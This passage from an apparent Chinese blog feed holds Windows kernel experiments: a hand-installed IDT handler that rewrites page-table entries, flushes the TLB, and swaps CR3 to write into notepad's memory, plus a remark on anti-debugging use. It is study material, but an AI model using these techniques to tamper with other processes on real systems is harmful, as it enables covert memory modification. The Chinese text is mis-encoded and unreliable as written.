-G-DA--KWEV</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å†…æ ¸å…±äº«æ•°æ®gdtræ˜¯æœ‰Gå±æ€§çš„ï¼Œä½†æ˜¯3ç¯æ•°æ®å°±æ²¡æœ‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>) | <span class="number">0x100</span>;<span class="comment">//æŠŠè™šæ‹Ÿåœ°å€çš„é¡µè¡¨é¡¹æ”¹ä¸ºGlobal</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax</span><br><span class="line">    &#125;<span class="comment">//åˆ·æ–°tlb</span></span><br><span class="line">    __asm mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//ç¡®ä¿è™šæ‹Ÿåœ°å€tlbé‡Œçš„gä½ç½®1</span></span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//æ¢å›åŸæ¥çš„é¡µè¡¨é¡¹</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov cr3, eax</span><br><span class="line">    &#125;<span class="comment">//åˆ·æ–°tlbï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬çš„page2 Gä½è¢«ç½®1ï¼Œæ‰€ä»¥ä¸ä¼šè¢«åˆ·æ–°ï¼Œpage2è¿˜æ˜¯æŒ‡å‘page1ç‰©ç†é¡µ</span></span><br><span class="line">    <span class="comment">//__asm invlpg ds:[0x0041c000] //å¼ºåˆ¶åˆ·æ–°ï¼Œæ— è§†gä½</span></span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//æŒ‚è½½ç‰©ç†å†…å­˜çš„åŒæ—¶æŠŠè™šæ‹Ÿå†…å­˜æ”¾åˆ°tlbé‡Œ</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>, g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g_var:1</span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:å»¶è¿Ÿå†…å­˜åˆ†é…</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-å»¶è¿Ÿå†…å­˜åˆ†é…"><a href="#Windowså†…æ ¸å®éªŒ-å»¶è¿Ÿå†…å­˜åˆ†é…" class="headerlink" title="Windowså†…æ ¸å®éªŒ:å»¶è¿Ÿå†…å­˜åˆ†é…"></a>Windowså†…æ ¸å®éªŒ:å»¶è¿Ÿå†…å­˜åˆ†é…</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD var1;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,var2</span><br><span class="line">        mov var1,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;var2:%p\n&quot;</span>,&amp;var2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var1:%d\n&quot;</span>,var1);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>ç”¨æ¥åˆ†é…ä¸€ä¸ªæ–°sectionï¼Œå¹¶æŠŠvar2å˜é‡æ”¾å…¥è¯¥section</p><p><a href="https://learn.microsoft.com/zh-cn/cpp/preprocessor/section?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/preprocessor/section?view=msvc-170</a></p><p><a href="https://learn.microsoft.com/zh-cn/cpp/cpp/allocate?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/cpp/allocate?view=msvc-170</a></p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/image-20230603011009892.png" alt="image-20230603011009892"></p><p>ä¸»è¦æ˜¯ä¸ºäº†è®©var2åœ¨ä¸€ä¸ªæ–°é¡µå¼€å§‹ï¼Œå³4kå¯¹é½ï¼Œè€Œä¸”è¿™ä¸ªé¡µé‡Œåªæœ‰è¿™ä¸ªå˜é‡</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br><span class="line">&amp;var2:<span class="number">0041B</span>000</span><br><span class="line">var1:<span class="number">0</span></span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰æ˜¯1çš„åŸå› æ˜¯<code>mov eax,var2</code>var2æ‰€åœ¨é¡µç¬¬ä¸€æ¬¡è¢«è®¿é—®ï¼Œç”±äºå»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæˆ‘ä»¬æ²¡æœ‰åœ¨ä¸­æ–­é‡Œæ„é€ æ­£ç¡®çš„ç¯å¢ƒï¼Œå¯¼è‡´ç¼ºé¡µå¤„ç†ç¨‹åºä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œæ‰€ä»¥ä¸º0</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªpauseåœä¸‹æ—¶å»ç”¨ceæˆ–è€…è°ƒè¯•å™¨è®¿é—®è¿™ä¸€æ®µå†…å­˜ï¼Œä¼šæŠŠè¿™æ®µè™šæ‹Ÿå†…å­˜æ˜ å°„åˆ°ç‰©ç†å†…å­˜</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/image-20230603012716985.png" alt="image-20230603012716985"></p><p><strong>è¿™ç§æœºåˆ¶å°±å¯ä»¥ç”¨åˆ°åè°ƒè¯•ä¸Šé¢å»</strong></p><p>å…¶å®åªè¦è¯»äº†var2çš„åœ°å€å°±ä¼šæŠŠè¿™ä¸ªé¡µé¢æ˜ å°„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD var1;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,var2</span><br><span class="line">        mov var1,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;var2:%p\n&quot;</span>,&amp;var2);</span><br><span class="line">    interrupt();<span class="comment">//è¯»è¿‡åœ°å€åå°±ä¼šæ˜ å°„è¿‡æ¥</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var1:%d\n&quot;</span>,var1);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;var2:<span class="number">0041B</span>000</span><br><span class="line">var1:<span class="number">1</span></span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:å¹³è¡Œè¿›ç¨‹</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-å¹³è¡Œè¿›ç¨‹"><a href="#Windowså†…æ ¸å®éªŒ-å¹³è¡Œè¿›ç¨‹" class="headerlink" title="Windowså†…æ ¸å®éªŒ:å¹³è¡Œè¿›ç¨‹"></a>Windowså†…æ ¸å®éªŒ:å¹³è¡Œè¿›ç¨‹</h1><p>ä¸»è¦æ€æƒ³å°±æ˜¯Aè¿›ç¨‹åœ¨åˆ‡æ¢Bè¿›ç¨‹çš„cr3åï¼Œå°†Bè¿›ç¨‹ä¸­å½“å‰Aè¿›ç¨‹çš„eipæ‰€æŒ‡å‘çš„åœ°å€æ„é€ ä¸ºè¦æƒ³è¦æ‰§è¡ŒæŒ‡ä»¤</p><h2 id="å®éªŒç°è±¡"><a href="#å®éªŒç°è±¡" class="headerlink" title="å®éªŒç°è±¡"></a>å®éªŒç°è±¡</h2><p><strong>process1.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//0x0041a1c8</span></span><br><span class="line">DWORD g_cr3;</span><br><span class="line">DWORD g_flag;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov g_cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">        <span class="comment">//00401048 CFiretd</span></span><br><span class="line">        <span class="comment">//0x401049 CCint3</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        nop<span class="comment">//0x40104e</span></span><br><span class="line">        nop<span class="comment">//0x40104f</span></span><br><span class="line">        nop<span class="comment">//0x401050</span></span><br><span class="line">        mov eax,<span class="number">0x654321</span></span><br><span class="line">        mov g_flag,eax</span><br><span class="line">        mov ecx,<span class="number">0x666666</span></span><br><span class="line">        mov eax,ds:[<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3,eax</span><br><span class="line">        <span class="comment">//00401066 0F 22 D8             mov         cr3,eax  </span></span><br><span class="line">        <span class="comment">//00401069 CC                   int         3  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cr3:0x%x\tg_flag:0x%x\n&quot;</span>, g_cr3, g_flag);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>process2.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//0x0041a1c8</span></span><br><span class="line">DWORD g_num;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov ds:[<span class="number">0x8003f130</span>],eax<span class="comment">//8003f130 gdtrè¡¨é‡Œç©ºé—²é¡¹</span></span><br><span class="line">        mov eax, <span class="number">0x8d301c0</span><span class="comment">//0x8d301c0 process1çš„cr3</span></span><br><span class="line">        mov cr3, eax</span><br><span class="line">        <span class="comment">//040104E 0F 22 D8    mov         cr3, eax</span></span><br><span class="line">        <span class="comment">//00401051 CC  int         3</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">//00401060 B8 FF FF FF FF       mov         eax, 0FFFFFFFFh</span></span><br><span class="line">        nop<span class="comment">//00401065</span></span><br><span class="line">        nop<span class="comment">//00401066</span></span><br><span class="line">        nop<span class="comment">//00401067</span></span><br><span class="line">        nop<span class="comment">//00401068</span></span><br><span class="line">        mov g_num, ecx</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cr3:0x%x\n&quot;</span>,g_num);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®éªŒç°è±¡å°±æ˜¯å…ˆè¿è¡Œprocess1ï¼Œæ‰“å°cr3ågflagä¸º0ï¼Œè¿è¡Œprocess2ågfalgè¢«ä¿®æ”¹ä¸º0x654321ï¼Œä¸”process2çš„g_numè¢«ä¿®æ”¹ä¸º0x66666</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/image-20230602235651166.png" alt="image-20230602235651166"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p><img src="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/image-20230603000923428.png" alt="image-20230603000923428"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:è·¨è¿›ç¨‹å†…å­˜è¯»å†™</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-è·¨è¿›ç¨‹å†…å­˜è¯»å†™"><a href="#Windowså†…æ ¸å®éªŒ-è·¨è¿›ç¨‹å†…å­˜è¯»å†™" class="headerlink" title="Windowså†…æ ¸å®éªŒ:è·¨è¿›ç¨‹å†…å­˜è¯»å†™"></a>Windowså†…æ ¸å®éªŒ:è·¨è¿›ç¨‹å†…å­˜è¯»å†™</h1><p>ä¸€ä¸ªè¿›ç¨‹è®¿é—®çš„è™šæ‹Ÿå†…å­˜éƒ½æ˜¯é é¡µçš„å„ç§è¡¨æ¥ç®¡ç†çš„å˜›ï¼Œä»–çš„æ ¹æºå°±æ˜¯cr3å¯„å­˜å™¨ï¼Œæ‰€ä»¥ç†è®ºä¸Šæˆ‘ä»¬æŠŠæŸä¸ªè¿›ç¨‹çš„cr3æ¢è¿‡æ¥å°±å¯ä»¥å®ç°è¯»å†™è¿™ä¸ªè¿›ç¨‹</p><p>æ‰“å¼€ä¸€ä¸ªnotepad</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/image-20230602212944955.png" alt="image-20230602212944955"></p><p>ç”¨ceæ‰¾åˆ°ä»–çš„å­—ç¬¦ä¸²å†…å­˜åœ°å€ä¸º0xaab30</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span> notepad.exe</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">8165f</span>350  SessionId: <span class="number">0</span>  Cid: <span class="number">0688</span>    Peb: <span class="number">7f</span>fd8000  ParentCid: <span class="number">04</span>a4</span><br><span class="line">    DirBase: <span class="number">08b</span>d0240  ObjectTable: e14bcae8  HandleCount:  <span class="number">46.</span></span><br><span class="line">    Image: notepad.exe</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾ˆè‡ªç„¶çš„å°±ä¼šå†™å‡ºè¿™æ ·çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[<span class="number">0x8003f130</span>],eax<span class="comment">//8003f130 gdtrè¡¨é‡Œç©ºé—²é¡¹</span></span><br><span class="line">        mov eax,<span class="number">0x8bd0240</span> <span class="comment">//08bd0240 notepadå¯¹åº”cr3</span></span><br><span class="line">        mov cr3,eax  <span class="comment">//åé¢çš„æŒ‡ä»¤å‹æ ¹ä¸ä¼šæ‰§è¡Œ</span></span><br><span class="line">        mov eax,<span class="number">0x12345678</span></span><br><span class="line">        mov ds:[<span class="number">0xaab30</span>],eax</span><br><span class="line">        mov eax,ds:[<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å…¶å®mov cr3,eax åé¢çš„æŒ‡ä»¤å‹æ ¹ä¸ä¼šæ‰§è¡Œï¼Œåˆ‡æ¢cr3åï¼Œæˆ‘eipå»å–æŒ‡ä»¤ï¼Œä½†æ˜¯ç°åœ¨å·²ç»æ˜¯notepadçš„cr3äº†ï¼Œè‡ªç„¶ä¸ä¼šå–åˆ°æˆ‘ä»¬ç¨‹åºçš„eipå¤„æŒ‡ä»¤ï¼Œè€Œæ˜¯notepadçš„eipå¤„æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™æ®µæŒ‡ä»¤åº”è¯¥æ”¾åˆ°å†…æ ¸ä¸­æ¯ä¸ªè¿›ç¨‹éƒ½ç›¸åŒçš„åœ°æ–¹ï¼Œä¾æ—§é€‰å–gdtè¡¨é‡Œçš„ç©ºé—²ä½ç½®0x8003f140</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span>* Address = (<span class="type">char</span> *)<span class="number">0x8003f140</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EditNotepad</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        Address[i] = ((<span class="type">char</span>*)EditNotepad)[i];</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x8003f140</span></span><br><span class="line">        ret<span class="comment">//ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªå¯„å­˜å™¨ jmp å¯„å­˜å™¨æ¥å®ç°åœ°å€æ— å…³</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) EditNotepad() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov ds : [<span class="number">0x8003f130</span>] , eax<span class="comment">//8003f130 gdtrè¡¨é‡Œç©ºé—²é¡¹</span></span><br><span class="line">        mov eax, <span class="number">0x8bd0240</span> <span class="comment">//08bd0240 notepadå¯¹åº”cr3</span></span><br><span class="line">        mov cr3, eax</span><br><span class="line">        mov eax, <span class="number">0x12345678</span></span><br><span class="line">        mov ds : [<span class="number">0xaab30</span>] , eax</span><br><span class="line">        mov eax, ds : [<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span 